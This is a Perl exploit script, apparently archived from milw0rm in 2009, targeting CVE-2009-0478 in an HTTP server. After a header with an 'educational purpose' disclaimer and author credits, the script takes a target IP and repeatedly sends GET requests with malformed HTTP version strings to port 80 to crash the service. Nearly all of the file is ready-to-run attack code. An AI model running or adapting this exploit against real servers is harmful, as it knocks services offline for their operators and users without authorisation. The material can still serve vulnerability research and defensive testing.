#!usr/bin/perl -w

########################################################################################
#
#    Reference:
#    http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-0478
#     http://www.securityfocus.com/bid/33604/discuss
#
#$$$$$This was strictly written for educational purpose. Use it at your own risk.$$$$$
#$$$$$Author will not bare any responsibility for any damages watsoever.$$$$$$$$$$$$$$
#
#         Visit:        http://www.evilfingers.com/
#        Author:    Praveen Dar$hanam
#        Email:     praveen[underscore]recker[at]sify.com\
#        Blog:      http://www.darshanams.blogspot.com/
#        Date:      09th February, 2009
#
############Special thanx2 Joshua Morin, Mikko Varpiola, and Jukka Taimisto ############
########################################################################################
######Thanx to str0ke,milw0rm, @rp m@n,security folks and all INDIAN H@CKER$############
########################################################################################


use IO::Socket;

print("\nEnter IP Address of Vulnerable Server: \n");
$vuln_server_ip = <STDIN>;
chomp($vuln_server_ip);

@malicious_version=("9.9","%.%","%%","#.#","\$.\$","*.*","975.975","10000999");

foreach $mal (@malicious_version)
{
   $sock_http = IO::Socket::INET->new(  PeerAddr => $vuln_server_ip,
                                     PeerPort => 80,
                                     Proto    => 'tcp') || "Unable to connect to HTTP Server";

   $http_attack = "GET / HTTP/$mal\r\n".
   "Host: $vuln_server_ip\r\n".
   "Keep-Alive: 300\r\n".
   "Connection: keep-alive\r\n\r\n";

   print $sock_http $http_attack;
   sleep(3);

   close($sock_http);
}

# milw0rm.com [2009-02-09]
